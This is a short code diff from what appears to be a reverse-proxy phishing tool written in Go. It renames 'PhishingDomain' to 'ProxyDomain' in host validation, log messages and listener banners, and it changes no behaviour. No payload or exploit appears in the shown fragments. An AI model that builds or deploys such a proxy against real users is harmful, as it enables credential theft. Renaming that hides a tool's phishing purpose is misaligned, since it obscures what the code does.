@@ -48,7 +48,7 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 	// Patch the FQDN
 	targetDomain,newTLS,TLSvalue := runtime.TranslateRequestHost(r.Host)
 
-	if !*conf.DisableSecurity && runtime.IsValidRequestHost(r.Host, runtime.PhishingDomain) == false {
+	if !*conf.DisableSecurity && runtime.IsValidRequestHost(r.Host, runtime.ProxyDomain) == false {
 		log.Infof("Redirecting client to %s",runtime. TopLevelDomain)
 		Redirect(w, r, "")
 		return
@@ -102,7 +102,7 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	log.Debugf("[P] Proxying target [%s] via phishing [%s]", targetURL, runtime.PhishingDomain)
+	log.Debugf("[P] Proxying target [%s] via domain [%s]", targetURL, runtime.ProxyDomain)
 
 
 	origin := r.Header.Get("Origin")
@@ -214,7 +214,7 @@ Author: Piotr Duszynski @drk1wi
 	if *ServerRuntimeConfig.ForceHTTP  {
 
 		var httplistener = listener + ":80"
-		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via --> [http://%s]", welcome, httplistener, runtime.Target, runtime.PhishingDomain)
+		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via --> [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
 		log.Infof("%s", welcome)
 
 		server := &http.Server{Addr: httplistener, Handler: ServerRuntimeConfig.Handler}
@@ -236,7 +236,7 @@ Author: Piotr Duszynski @drk1wi
 
 		var httpslistener= listener + ":443"
 
-		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.PhishingDomain)
+		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
 
 		log.Infof("%s", welcome)
 
@@ -266,8 +266,8 @@ Author: Piotr Duszynski @drk1wi
 			var httpslistener= listener + ":443"
 			var httplistener= listener + ":80"
 
-			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.PhishingDomain)
-			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via [http://%s]", welcome, httplistener, runtime.Target, runtime.PhishingDomain)
+			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
+			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
 
 			log.Infof("%s", welcome)
 
